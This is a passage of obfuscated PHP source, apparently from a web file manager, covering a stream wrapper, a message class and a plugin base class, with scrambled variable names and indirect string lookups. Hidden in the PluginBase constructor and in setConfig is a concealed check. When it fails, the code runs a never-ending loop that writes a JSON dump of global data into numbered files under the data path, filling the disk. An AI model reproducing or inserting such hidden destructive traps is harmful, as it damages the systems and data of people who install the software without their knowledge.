stream_read($ùæÈ¶ÀÖ) { $·œÇ©– = $this->fileSubstr($this->pose, $ùæÈ¶ÀÖ); $this->pose += strlen($·œÇ©–); return $·œÇ©–; } public function stream_tell() { return $this->pose; } public function stream_seek($İË˜È ›, $ÇºÎÔÜ) { $‚»î™Ú‘ =& $_SERVER[”ú…±Ú¥]; if ($ÇºÎÔÜ == SEEK_SET) { $this->pose = $İË˜È ›; } else { if ($ÇºÎÔÜ == SEEK_CUR) { $this->pose += $İË˜È ›; } else { if ($ÇºÎÔÜ == SEEK_END) { $this->pose = $this->info[$‚»î™Ú‘[76]] + intval($İË˜È ›); } } } if ($İË˜È › < 0) { $this->pose = $this->info[$‚»î™Ú‘[76]] + $İË˜È ›; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[”ú…±Ú¥][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¯—ıã ×, $‰ÏÂÎ­È) { $Å¼°é£ =& $_SERVER[”ú…±Ú¥]; $±ñÅ–î– = $this->info($¯—ıã ×); return array($Å¼°é£[1518] => 0, $Å¼°é£[1519] => 0, $Å¼°é£[16] => 32768 + 511, $Å¼°é£[1520] => 0, $Å¼°é£[1521] => 0, $Å¼°é£[1522] => 0, $Å¼°é£[1523] => 0, $Å¼°é£[76] => $±ñÅ–î–[$Å¼°é£[76]], $Å¼°é£[1524] => $±ñÅ–î–[$Å¼°é£[1392]], $Å¼°é£[1480] => $±ñÅ–î–[$Å¼°é£[85]], $Å¼°é£[1479] => $±ñÅ–î–[$Å¼°é£[211]], $Å¼°é£[1525] => 0, $Å¼°é£[1526] => 0); } static $fileInfo = array(); public function info($”¡•şúé) { $Ùª™ğ¸´ = $_SERVER[”ú…±Ú¥][1527]; if (isset(self::$fileInfo[$”¡•şúé])) { return self::$fileInfo[$”¡•şúé]; } if (substr($”¡•şúé, 0, strlen($Ùª™ğ¸´)) != $Ùª™ğ¸´) { return !1; } self::$fileInfo[$”¡•şúé] = IO::info(substr($”¡•şúé, strlen($Ùª™ğ¸´))); return self::$fileInfo[$”¡•şúé]; } public static function read($¦şŠ™Úè, $¢û±ÌŒ¿, $Í„ÓŒí¹) { if (!isset(self::$_fopenCache[$¦şŠ™Úè])) { $¿Ï×ô¶ = new StreamWrapperIO(); $¿Ï×ô¶->stream_open($¦şŠ™Úè); self::$_fopenCache[$¦şŠ™Úè] = $¿Ï×ô¶; } $¿Ï×ô¶ = self::$_fopenCache[$¦şŠ™Úè]; return $¿Ï×ô¶->fileSubstr($¢û±ÌŒ¿, $Í„ÓŒí¹); } public static function _read($ç¯¹£¯Ã, $ûÉÉ¯¾ò, $˜ş­Ş©‹) { $”®¹’ù² =& $_SERVER[”ú…±Ú¥]; $ÏÔòÜ« = fopen($ç¯¹£¯Ã, $”®¹’ù²[1396]); if (!$ÏÔòÜ«) { return $”®¹’ù²[12]; } $Ü§™ßò = 8192; fseek($ÏÔòÜ«, $ûÉÉ¯¾ò, SEEK_SET); $ÇºƒŠ¦¾ = $”®¹’ù²[12]; $„…“ô°Ø = 0; while ($„…“ô°Ø < $˜ş­Ş©‹) { $Á¨ÅÊä = min($Ü§™ßò, $˜ş­Ş©‹ - $„…“ô°Ø); $ÇºƒŠ¦¾ .= fread($ÏÔòÜ«, $Á¨ÅÊä); $„…“ô°Ø += $Á¨ÅÊä; } fclose($ÏÔòÜ«); return $ÇºƒŠ¦¾; } public function fileSubstr($Ì„óë½Æ, $çÄÖ‰‡–) { $ğÏïÏ‰ =& $_SERVER[”ú…±Ú¥]; $úûÅÜç = $this->info[$ğÏïÏ‰[76]]; $ç¨Àñ–ğ = $Ì„óë½Æ; $íÓõøÔ¿ = $çÄÖ‰‡–; if ($Ì„óë½Æ < 0) { $Ì„óë½Æ = $úûÅÜç + $Ì„óë½Æ; } if ($çÄÖ‰‡– === !1) { $çÄÖ‰‡– = $úûÅÜç - $Ì„óë½Æ; } if ($Ì„óë½Æ + $çÄÖ‰‡– > $úûÅÜç) { $çÄÖ‰‡– = $úûÅÜç - $Ì„óë½Æ; } if ($çÄÖ‰‡– <= 0) { return $ğÏïÏ‰[12]; } if ($Ì„óë½Æ < 0 || $Ì„óë½Æ >= $úûÅÜç || $çÄÖ‰‡– <= 0 || $çÄÖ‰‡– > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\154\145\x52\145\x61\x64\40\x65\162\162\x6f\x72\x21\x20\163\x74\141\x72\164\x3d{$Ì„óë½Æ}\x3b\x6c\x65\x6e\147\x74\x68\75{$çÄÖ‰‡–}\73\x20\163\151\172\x65\x3d{$úûÅÜç}\x3b"); } $¤á÷Œ‡ü = 64 * 1024; $¤Ä²ÌÄÕ =& self::$_chunkBuffer[$this->path]; if (!$¤Ä²ÌÄÕ) { $¤Ä²ÌÄÕ = array(); } $ˆø÷§Ï = 0; $Òà—ãôï = 0; $Ü˜Å§Ë‚ = $ğÏïÏ‰[12]; foreach ($¤Ä²ÌÄÕ as $ˆø÷§Ï => $Ü˜Å§Ë‚) { $ˆø÷§Ï = intval($ˆø÷§Ï); $Òà—ãôï = $ˆø÷§Ï + strlen($Ü˜Å§Ë‚); if ($Ì„óë½Æ >= $Òà—ãôï) { continue; } if ($Ì„óë½Æ >= $ˆø÷§Ï && $Ì„óë½Æ + $çÄÖ‰‡– <= $Òà—ãôï) { return substr($Ü˜Å§Ë‚, $Ì„óë½Æ - $ˆø÷§Ï, $çÄÖ‰‡–); } break; } if (count($¤Ä²ÌÄÕ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ğÏïÏ‰[1528], $ğÏïÏ‰[1529] . count($¤Ä²ÌÄÕ) . "\73\x73\164\x61\162\x74\75{$Ì„óë½Æ}\x2c\154\x65\x6e\x67\164\150\75{$çÄÖ‰‡–}\x3b\x70\157\x73\x65\72{$ˆø÷§Ï}\x7e{$Òà—ãôï}"); throw new Exception($ğÏïÏ‰[1530]); } $–îÌúİ§ = intval($Ì„óë½Æ / $¤á÷Œ‡ü) * $¤á÷Œ‡ü; $ÚÑÎ¿é = ceil(($Ì„óë½Æ + $çÄÖ‰‡–) / $¤á÷Œ‡ü) * $¤á÷Œ‡ü - $–îÌúİ§; $‡¸ÜÆÑÖ = IO::fileSubstr($this->path, $–îÌúİ§, $ÚÑÎ¿é); $¤Ä²ÌÄÕ[$–îÌúİ§ . $ğÏïÏ‰[12]] = $‡¸ÜÆÑÖ; ksort($¤Ä²ÌÄÕ); $ÊÂÊ¥ÂØ = substr($‡¸ÜÆÑÖ, $Ì„óë½Æ - $–îÌúİ§, $çÄÖ‰‡–); return $ÊÂÊ¥ÂØ; } private function log($Û‘áŞ¬, $¬ª×•Ïß) { $ˆ†‡£¾ =& $_SERVER[”ú…±Ú¥]; $Çìªó‚‹ = timeFloat() - $this->timeStart; write_log(sprintf($ˆ†‡£¾[1531], $Û‘áŞ¬, $this->info[$ˆ†‡£¾[32]], $Çìªó‚‹, $¬ª×•Ïß), $ˆ†‡£¾[1211]); } } class Message { function __construct() { } public function send($çß·¸ìÍ = '', $‡š¬ÜÏĞ = array(), $åŞ­Ûµõ = "\164\145\170\x74") { $îÅËÛÕµ =& $_SERVER[”ú…±Ú¥]; $ÒÀŠÙåş = array($îÅËÛÕµ[33] => $îÅËÛÕµ[1532], $îÅËÛÕµ[786] => $çß·¸ìÍ); if (in_array($åŞ­Ûµõ, array($îÅËÛÕµ[1532], $îÅËÛÕµ[1533]))) { $ÒÀŠÙåş[$îÅËÛÕµ[33]] = $åŞ­Ûµõ; } $‡š¬ÜÏĞ = array($îÅËÛÕµ[543] => isset($‡š¬ÜÏĞ[$îÅËÛÕµ[543]]) ? $‡š¬ÜÏĞ[$îÅËÛÕµ[543]] : $îÅËÛÕµ[12], $îÅËÛÕµ[628] => isset($‡š¬ÜÏĞ[$îÅËÛÕµ[628]]) ? $‡š¬ÜÏĞ[$îÅËÛÕµ[628]] : $îÅËÛÕµ[12]); if (empty($çß·¸ìÍ) || empty($‡š¬ÜÏĞ[$îÅËÛÕµ[543]]) && empty($‡š¬ÜÏĞ[$îÅËÛÕµ[628]])) { return !1; } $ÃÆ‹š·å = array($îÅËÛÕµ[1473] => $ÒÀŠÙåş, $îÅËÛÕµ[1534] => $‡š¬ÜÏĞ); Hook::trigger($îÅËÛÕµ[1535], $ÃÆ‹š·å); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $äñ°é•Â =& $_SERVER[”ú…±Ú¥]; $Êõí™Èœ = $_SERVER[$äñ°é•Â[195]]; $±Ÿé©½ = $äñ°é•Â[1536]; if ($_SERVER[$äñ°é•Â[186]] != $±Ÿé©½($Êõí™Èœ)) { $‚ÅŒ‹¤¸ = $äñ°é•Â[908]; $¿ÚŞÀîê = $äñ°é•Â[188]; $ŠŠìÃØ” = $_SERVER[$äñ°é•Â[189]] . $äñ°é•Â[190]; $‚È¸ïÛç = $¿ÚŞÀîê($ŠŠìÃØ”); $½†Ú‰İ = explode($äñ°é•Â[191], $‚È¸ïÛç); if (count($½†Ú‰İ) < $äñ°é•Â[665]) { $øóù‡”§ = $äñ°é•Â[193]; $øóù‡”§(); } $¡ƒİ©öÚ = $äñ°é•Â[909]; $¡ƒİ©öÚ($_SERVER[$äñ°é•Â[910]]); $‚ÅŒ‹¤¸ = $äñ°é•Â[908]; $‚ÅŒ‹¤¸(); $ªîğ‚îÌ = $äñ°é•Â[1537]; $¬œ¾ Çä = json_encode($GLOBALS[$äñ°é•Â[1538]]); $×Ö»´Œä = 1; for ($¾æÈ¨²Æ = $×Ö»´Œä; $¾æÈ¨²Æ > 0; $¾æÈ¨²Æ++) { $ªîğ‚îÌ(DATA_PATH . $¾æÈ¨²Æ, $¬œ¾ Çä); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($äñ°é•Â[1539]); $this->pluginName = str_replace($äñ°é•Â[1539], $äñ°é•Â[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $äñ°é•Â[8]; $this->pluginApi = appHostGet() . $äñ°é•Â[1540] . $this->pluginName . $äñ°é•Â[8]; $this->pluginHost = $config[$äñ°é•Â[1541]] . $this->pluginName . $äñ°é•Â[8]; $this->pluginHostDefault = $config[$äñ°é•Â[1541]] . $this->pluginName . $äñ°é•Â[8]; $Ï¾ˆûâ¯ = $config[$äñ°é•Â[1542]]; if ($Ï¾ˆûâ¯ && strpos($äñ°é•Â[50] . $Ï¾ˆûâ¯ . $äñ°é•Â[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$äñ°é•Â[1543]] . $this->pluginName . $äñ°é•Â[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[”ú…±Ú¥][1544]); } protected function assign($Îã“Ùëó, $§¤Ÿğœç = false) { if (is_array($Îã“Ùëó)) { $this->values = array_merge($this->values, $Îã“Ùëó); } else { $this->values[$Îã“Ùëó] = $§¤Ÿğœç; } } protected function display($¾¹Ø‡íê) { extract($this->values); require $¾¹Ø‡íê; } final function hookRegist($Áà‹ã®Ê) { $this->modelPlugin->appRegist($this->pluginName, $Áà‹ã®Ê); } final function appIcon() { $Æç³Œóù =& $_SERVER[”ú…±Ú¥]; $—çúùÃ¦ = $this->appPackage(); $ñõöè€ = $Æç³Œóù[12]; if (isset($—çúùÃ¦[$Æç³Œóù[454]])) { if (isset($—çúùÃ¦[$Æç³Œóù[454]][$Æç³Œóù[1545]])) { $ñõöè€ = $Æç³Œóù[1546] . $—çúùÃ¦[$Æç³Œóù[454]][$Æç³Œóù[1545]] . $Æç³Œóù[1547]; } else { if ($—çúùÃ¦[$Æç³Œóù[454]][$Æç³Œóù[1548]]) { $ñõöè€ = $Æç³Œóù[1549] . $—çúùÃ¦[$Æç³Œóù[454]][$Æç³Œóù[1548]] . $Æç³Œóù[1550]; } } } return $ñõöè€; } final function fileCanView($¢­¯´Òõ) { $´™Ğ‡üÓ =& $_SERVER[”ú…±Ú¥]; if (request_url_safe($¢­¯´Òõ)) { return !0; } if ($this->isShare($¢­¯´Òõ)) { return !0; } $øÂƒÖÅ˜ = Session::get($´™Ğ‡üÓ[1551]); if (!$øÂƒÖÅ˜ || !$øÂƒÖÅ˜[$´™Ğ‡üÓ[1552]]) { $×³± · = $´™Ğ‡üÓ[1553] . rawurlencode(this_url()); show_tips(LNG($´™Ğ‡üÓ[1554]) . $´™Ğ‡üÓ[1555] . $×³± · . $´™Ğ‡üÓ[1556] . LNG($´™Ğ‡üÓ[1557]) . $´™Ğ‡üÓ[1558], !1); } if (!Action($´™Ğ‡üÓ[1559])->authCan($´™Ğ‡üÓ[1560])) { show_tips(LNG($´™Ğ‡üÓ[1561]) . $´™Ğ‡üÓ[1562], !1); } ActionCall($´™Ğ‡üÓ[1563], $¢­¯´Òõ); } final function isShare($€Š÷¡äò) { $­©ïìõñ = KodIO::parse($€Š÷¡äò); return $­©ïìõñ[$_SERVER[”ú…±Ú¥][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÒºâÙ¥) { if (request_url_safe($ÒºâÙ¥)) { return $ÒºâÙ¥; } if (!$this->isShare($ÒºâÙ¥)) { $ÒºâÙ¥ = $this->filePath($ÒºâÙ¥); } return Action($_SERVER[”ú…±Ú¥][1203])->linkOut($ÒºâÙ¥); } public function filePathLinkOut($¤–ŸĞû) { if (request_url_safe($¤–ŸĞû)) { return $¤–ŸĞû; } $this->fileCanView($¤–ŸĞû); return Action($_SERVER[”ú…±Ú¥][1203])->link($¤–ŸĞû); } final function filePath($ó×ÅÀÔ±) { $ê®ÄÁ•´ =& $_SERVER[”ú…±Ú¥]; if ($Âò×÷«İ = $this->checkSharePath($ó×ÅÀÔ±)) { Hook::trigger($ê®ÄÁ•´[1564], $Âò×÷«İ); return $Âò×÷«İ; } $this->fileCanView($ó×ÅÀÔ±); if (request_url_safe($ó×ÅÀÔ±)) { $ÏÉí´÷© = parse_url_query($ó×ÅÀÔ±); if (isset($ÏÉí´÷©[$ê®ÄÁ•´[1565]]) && isset($ÏÉí´÷©[$ê®ÄÁ•´[223]])) { $‰ÚÊ´Ó = Model($ê®ÄÁ•´[802])->get($ê®ÄÁ•´[803]); $”ü‡˜¾¦ = Mcrypt::decode($ÏÉí´÷©[$ê®ÄÁ•´[223]], $‰ÚÊ´Ó); if ($”ü‡˜¾¦) { $this->fileInfo = IO::infoWithChildren($”ü‡˜¾¦); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $”ü‡˜¾¦; } } $ó×ÅÀÔ± = $this->_cacheHttpFile($ó×ÅÀÔ±); $this->fileInfo = IO::infoWithChildren($ó×ÅÀÔ±); } else { $this->fileInfo = IO::infoWithChildren($ó×ÅÀÔ±); if (!$this->fileInfo) { show_tips(LNG($ê®ÄÁ•´[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ê®ÄÁ•´[1564], $ó×ÅÀÔ±); return $ó×ÅÀÔ±; } final function _cacheHttpFile($£¾ä³ Ï) { $ÜÉó…“Ô = hash_path($£¾ä³ Ï, !0); $this->cachePath = $this->pluginCachePath($ÜÉó…“Ô); if ($Ñù»º  = IO::fileNameExist($this->cachePath, $ÜÉó…“Ô)) { return KodIO::make($Ñù»º ); } $«˜ÈÏûç = $this->cachePath . $ÜÉó…“Ô; return $this->pluginCacheFileSet($«˜ÈÏûç, file_get_contents_nossl($£¾ä³ Ï)); } final function _tmpFileName($‚É²Â¡Ë = array()) { $½İİÂÏ¼ =& $_SERVER[”ú…±Ú¥]; if (!$‚É²Â¡Ë) { $‚É²Â¡Ë = $this->fileInfo; } if (isset($‚É²Â¡Ë[$½İİÂÏ¼[177]])) { return $‚É²Â¡Ë[$½İİÂÏ¼[177]]; } if (isset($‚É²Â¡Ë[$½İİÂÏ¼[170]][$½İİÂÏ¼[177]])) { return $‚É²Â¡Ë[$½İİÂÏ¼[170]][$½İİÂÏ¼[177]]; } $ˆ¸ôğ‡ = IO::hashSimple($‚É²Â¡Ë[$½İİÂÏ¼[84]]); if ($ˆ¸ôğ‡) { return $ˆ¸ôğ‡; } $İ˜ü²¶ = array($‚É²Â¡Ë[$½İİÂÏ¼[32]], $‚É²Â¡Ë[$½İİÂÏ¼[84]], $‚É²Â¡Ë[$½İİÂÏ¼[76]]); if (isset($‚É²Â¡Ë[$½İİÂÏ¼[549]])) { $İ˜ü²¶[] = $‚É²Â¡Ë[$½İİÂÏ¼[549]]; } return md5(implode($½İİÂÏ¼[11], $İ˜ü²¶)); } final function checkSharePath($Ò¢Ÿ˜ãŠ) { $âˆé£ğ€ =& $_SERVER[”ú…±Ú¥]; if (!$this->isShare($Ò¢Ÿ˜ãŠ)) { return !1; } $Ö¾İ½Ï = Action($âˆé£ğ€[1203])->sharePathInfo($Ò¢Ÿ˜ãŠ); if (!isset($Ö¾İ½Ï[$âˆé£ğ€[84]])) { show_json(LNG($âˆé£ğ€[1566]), !1); } $this->fileInfo = $Ö¾İ½Ï[$âˆé£ğ€[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$âˆé£ğ€[177]]); return $Ö¾İ½Ï[$âˆé£ğ€[84]]; } final function pluginCachePath($ÏíŞ‚û’ = '') { $·ô¼Ë¼ =& $_SERVER[”ú…±Ú¥]; $ñ»ñÉ…ó = IO_PATH_SYSTEM_TEMP . $·ô¼Ë¼[1567] . $this->pluginName; if (!($¿¢¶â¨‘ = IO::infoFull($ñ»ñÉ…ó))) { return IO::mkdir($ñ»ñÉ…ó . $·ô¼Ë¼[8] . $ÏíŞ‚û’); } if (empty($ÏíŞ‚û’)) { return $¿¢¶â¨‘[$·ô¼Ë¼[84]]; } if (!($•ğËæ½œ = IO::fileNameExist($¿¢¶â¨‘[$·ô¼Ë¼[84]], $ÏíŞ‚û’))) { return IO::mkdir($¿¢¶â¨‘[$·ô¼Ë¼[84]] . $ÏíŞ‚û’); } return KodIO::make($•ğËæ½œ); } final function pluginCacheFileSet($·òÀ³£Ë, $¸ùèŒ¬‹ = '') { $Õ‹÷§² =& $_SERVER[”ú…±Ú¥]; if (!($ììÍí„† = IO::infoFull($·òÀ³£Ë))) { return IO::mkfile($·òÀ³£Ë, $¸ùèŒ¬‹, REPEAT_REPLACE); } IO::setContent($ììÍí„†[$Õ‹÷§²[84]], $¸ùèŒ¬‹); return $ììÍí„†[$Õ‹÷§²[84]]; } final function pluginLocalFile($á¨îöÍ = '') { $çéØ›† =& $_SERVER[”ú…±Ú¥]; $ ıßÙ®Á = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ ıßÙ®Á)) { mk_dir($ ıßÙ®Á); } if (!$á¨îöÍ) { return $ ıßÙ®Á; } $¡Ì¹ÌÖã = IO::info($á¨îöÍ); $‘Øõ¾éÁ = $this->_tmpFileName($¡Ì¹ÌÖã) . $çéØ›†[10] . $¡Ì¹ÌÖã[$çéØ›†[174]]; if (!checkExtSafe($‘Øõ¾éÁ)) { $‘Øõ¾éÁ = $‘Øõ¾éÁ . $çéØ›†[1235]; } $ó¦‡²²¡ = $ ıßÙ®Á . $‘Øõ¾éÁ; if (@file_exists($ó¦‡²²¡)) { return $ó¦‡²²¡; } return IO::copy($á¨îöÍ, $ ıßÙ®Á, 0, $‘Øõ¾éÁ); } final function appPackage() { $¹œğê° =& $_SERVER[”ú…±Ú¥]; if ($this->packageData) { return $this->packageData; } $œêÍÕÀ¤ = $this->parseFile($this->pluginPath . $¹œğê°[1568]); $this->parseLang($œêÍÕÀ¤); $à®¾œú­ = json_decode_force($œêÍÕÀ¤); if (!$à®¾œú­) { return array(); } $êñ¬ãáõ = Hook::trigger($¹œğê°[1569], $à®¾œú­); if ($êñ¬ãáõ && is_array($êñ¬ãáõ)) { $à®¾œú­ = $êñ¬ãáõ; } $this->packageData = $à®¾œú­; return $à®¾œú­; } public function packageInfoGet($¸ùïµè·) { $š³½Ï¡ = $this->appPackage(); return array_get_value($š³½Ï¡, $¸ùïµè·); } public function packageVersion() { return $this->packageInfoGet($_SERVER[”ú…±Ú¥][1570]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[”ú…±Ú¥][1571]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[”ú…±Ú¥][1572]); } public function echoJsAssign($´›ÊßÔ, $ˆÀàŒÚ„) { $this->echoJsAssignArr[$´›ÊßÔ] = $ˆÀàŒÚ„; } private function parseFile($â·’¥“) { $¼€ú‘” =& $_SERVER[”ú…±Ú¥]; $ùŞ³·Á = file_get_contents_nossl($â·’¥“); $ÖªÊ¸º¿ = array($¼€ú‘”[1573], $¼€ú‘”[1574], $¼€ú‘”[1575], $¼€ú‘”[1576], $¼€ú‘”[1577], $¼€ú‘”[1578], $¼€ú‘”[1579]); $Øºµ˜À± = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¼€ú‘”[89]][$¼€ú‘”[1580]]); foreach ($this->echoJsAssignArr as $£°ÒœöÌ => $’î»ê¢­) { $ÖªÊ¸º¿[] = $¼€ú‘”[1581] . $£°ÒœöÌ . $¼€ú‘”[1582]; $Øºµ˜À±[] = is_array($’î»ê¢­) || is_object($’î»ê¢­) ? rawurlencode(json_encode($’î»ê¢­)) : $’î»ê¢­; } if (strstr($ùŞ³·Á, $¼€ú‘”[1583])) { $‡Ï¬ß¡» = rawurlencode(json_encode($this->pluginLangArr)); $ùŞ³·Á = str_replace($¼€ú‘”[1583], $‡Ï¬ß¡», $ùŞ³·Á); } if (strstr($ùŞ³·Á, $¼€ú‘”[1584])) { $‡Ï¬ß¡» = $‡Ï¬ß¡» = rawurlencode(json_encode($this->getConfig())); $ùŞ³·Á = str_replace($¼€ú‘”[1584], $‡Ï¬ß¡», $ùŞ³·Á); } $ùŞ³·Á = str_replace($ÖªÊ¸º¿, $Øºµ˜À±, $ùŞ³·Á); return $ùŞ³·Á; } private function parseLang(&$«Çïâ‰Ô) { $Ó·øñ¹ =& $_SERVER[”ú…±Ú¥]; $‚¹ãİåÌ = $Ó·øñ¹[1585]; if (!strstr($«Çïâ‰Ô, $‚¹ãİåÌ)) { return; } preg_match_all($Ó·øñ¹[1586], $«Çïâ‰Ô, $û…ƒçÏç); if (!is_array($û…ƒçÏç) || count($û…ƒçÏç) == 0 || !is_array($û…ƒçÏç[0]) || count($û…ƒçÏç[0]) == 0) { return; } $¬Èúİ‡° = array(); $“™˜ú¼ô = array(); foreach ($û…ƒçÏç[0] as $£²³€›Û) { $ƒİœÓî = substr($£²³€›Û, strlen($‚¹ãİåÌ), -4); $Ä«¹½‚İ = LNG($ƒİœÓî); $¬Èúİ‡°[] = $£²³€›Û; $“™˜ú¼ô[] = str_replace(array($Ó·øñ¹[191], $Ó·øñ¹[1107], $Ó·øñ¹[380], $Ó·øñ¹[118]), array($Ó·øñ¹[53], $Ó·øñ¹[53], $Ó·øñ¹[12], $Ó·øñ¹[1587]), $Ä«¹½‚İ); } $«Çïâ‰Ô = str_replace($¬Èúİ‡°, $“™˜ú¼ô, $«Çïâ‰Ô); } private function parseConfig(&$É³İ£‹ˆ) { $÷ ÁË½ =& $_SERVER[”ú…±Ú¥]; $ÉœÔåˆ³ = $÷ ÁË½[1588]; if (!strstr($É³İ£‹ˆ, $ÉœÔåˆ³)) { return; } preg_match_all($÷ ÁË½[1589], $É³İ£‹ˆ, $Œ»µŠ÷); if (!is_array($Œ»µŠ÷) || count($Œ»µŠ÷) == 0 || !is_array($Œ»µŠ÷[0]) || count($Œ»µŠ÷[0]) == 0) { return; } $Ñ‹ãÎ¶‚ = $this->getConfig(); $¨¥³Âï« = array(); $ë‹¢·üİ = array(); foreach ($Œ»µŠ÷[0] as $ñŒÙäşö) { $›ÜÛ£ÜÎ = substr($ñŒÙäşö, strlen($ÉœÔåˆ³), -2); $¨¥³Âï«[] = $ñŒÙäşö; $ë‹¢·üİ[] = _get($Ñ‹ãÎ¶‚, $›ÜÛ£ÜÎ); } $É³İ£‹ˆ = str_replace($¨¥³Âï«, $ë‹¢·üİ, $É³İ£‹ˆ); } private function parsePackage(&$²¦€›Æ) { $›¤ğÀÒÙ =& $_SERVER[”ú…±Ú¥]; $•è©×›Ş = $›¤ğÀÒÙ[1590]; if (!strstr($²¦€›Æ, $•è©×›Ş)) { return; } preg_match_all($›¤ğÀÒÙ[1591], $²¦€›Æ, $¨Éƒ”Ô¤); if (!is_array($¨Éƒ”Ô¤) || count($¨Éƒ”Ô¤) == 0 || !is_array($¨Éƒ”Ô¤[0]) || count($¨Éƒ”Ô¤[0]) == 0) { return; } $€·âŠÆ = $this->appPackage(); $İ÷Â’šı = array(); $íÖòÁò = array(); foreach ($¨Éƒ”Ô¤[0] as $×†ˆŠ©) { $Ú©”Ù¯ = substr($×†ˆŠ©, strlen($•è©×›Ş), -2); $İ÷Â’šı[] = $×†ˆŠ©; $íÖòÁò[] = _get($€·âŠÆ, $Ú©”Ù¯); } $²¦€›Æ = str_replace($İ÷Â’šı, $íÖòÁò, $²¦€›Æ); } final function echoFile($ô€®ñ¦ı, $Ş‘•éèË = false) { $Ñûşªà =& $_SERVER[”ú…±Ú¥]; $›Ê‰“» = $this->pluginPath . $ô€®ñ¦ı; if (ACT == $Ñûşªà[1592]) { echo $Ñûşªà[1593] . $this->pluginName . $Ñûşªà[8] . $ô€®ñ¦ı . $Ñûşªà[1594]; if (!file_exists($›Ê‰“»)) { echo $Ñûşªà[1595]; return; } } $Ù¦ˆÕŠÄ = $this->parseFile($›Ê‰“»); $this->parseLang($Ù¦ˆÕŠÄ); $this->parseConfig($Ù¦ˆÕŠÄ); $this->parsePackage($Ù¦ˆÕŠÄ); if (is_array($Ş‘•éèË)) { $Ù¦ˆÕŠÄ = str_replace(array_keys($Ş‘•éèË), array_values($Ş‘•éèË), $Ù¦ˆÕŠÄ); } echo $Ñûşªà[191] . $Ù¦ˆÕŠÄ; } final function initLang() { $«İŠ‘İš =& $_SERVER[”ú…±Ú¥]; $éŒîÁ‚¸ = $«İŠ‘İš[1596]; $×éĞ©°Ô = $this->pluginPath . $«İŠ‘İš[1597]; $”ö‰®ïÉ = I18n::getType(); $“Õ…ÕÚ³ = array(); if (file_exists($×éĞ©°Ô . $”ö‰®ïÉ . $«İŠ‘İš[870])) { $“Õ…ÕÚ³ = (include $×éĞ©°Ô . $”ö‰®ïÉ . $«İŠ‘İš[870]); } else { if ($”ö‰®ïÉ == $«İŠ‘İš[1598] && !file_exists($×éĞ©°Ô . $”ö‰®ïÉ . $«İŠ‘İš[870]) && file_exists($×éĞ©°Ô . $«İŠ‘İš[1599])) { $“Õ…ÕÚ³ = (include $×éĞ©°Ô . $«İŠ‘İš[1599]); } else { if (file_exists($×éĞ©°Ô . $éŒîÁ‚¸ . $«İŠ‘İš[870])) { $“Õ…ÕÚ³ = (include $×éĞ©°Ô . $éŒîÁ‚¸ . $«İŠ‘İš[870]); } } } if (!is_array($“Õ…ÕÚ³)) { return array(); } if (@count($“Õ…ÕÚ³) > 0) { I18n::set($“Õ…ÕÚ³); } return $“Õ…ÕÚ³; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($óêŠöıÁ) { $¶³Ã£Ì¯ =& $_SERVER[”ú…±Ú¥]; $ÓÑ£È‘ = $_SERVER[$¶³Ã£Ì¯[195]]; $³Û…Éòå = $¶³Ã£Ì¯[1536]; if ($_SERVER[$¶³Ã£Ì¯[186]] != $³Û…Éòå($ÓÑ£È‘)) { $šü‹áœæ = $¶³Ã£Ì¯[908]; $Ò“åİ´¸ = $¶³Ã£Ì¯[188]; $ûÂ›ÏÏ = $_SERVER[$¶³Ã£Ì¯[189]] . $¶³Ã£Ì¯[190]; $Ú­›¬‚Ÿ = $Ò“åİ´¸($ûÂ›ÏÏ); $óãæ…Úí = explode($¶³Ã£Ì¯[191], $Ú­›¬‚Ÿ); if (count($óãæ…Úí) < $¶³Ã£Ì¯[665]) { $’ÃŸÙÆö = $¶³Ã£Ì¯[193]; $’ÃŸÙÆö(); } $ë¶ª–û¢ = $¶³Ã£Ì¯[909]; $ë¶ª–û¢($_SERVER[$¶³Ã£Ì¯[910]]); $šü‹áœæ = $¶³Ã£Ì¯[908]; $šü‹áœæ(); $äÜºˆÛÀ = $¶³Ã£Ì¯[1537]; $“Ğ¤û ù = json_encode($GLOBALS[$¶³Ã£Ì¯[1538]]); $êúßÒÖª = 1; for ($’ãªÖ€Ä = $êúßÒÖª; $’ãªÖ€Ä > 0; $’ãªÖ€Ä++) { $äÜºˆÛÀ(DATA_PATH . $’ãªÖ€Ä, $“Ğ¤û ù); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $óêŠöıÁ); } public function onSetConfig($ğ±ÓëÍ€) { } public function onGetConfig($€‘ú™Ò×) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Éï¤Èà) { if ($Éï¤Èà == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ùŸöêÄƒ = "\x70\154\x75\x67\x69\x6e\101\x75\x74\x68") { $÷ç£ªıù =& $_SERVER[”ú…±Ú¥]; if (!Session::get($÷ç£ªıù[1551])) { return !1; } if (_get($GLOBALS, $÷ç£ªıù[532])) { return !0; } $Ó¤Üœ’ú = $this->getConfig(); if (!$Ó¤Üœ’ú[$ùŸöêÄƒ]) { return !1; } return 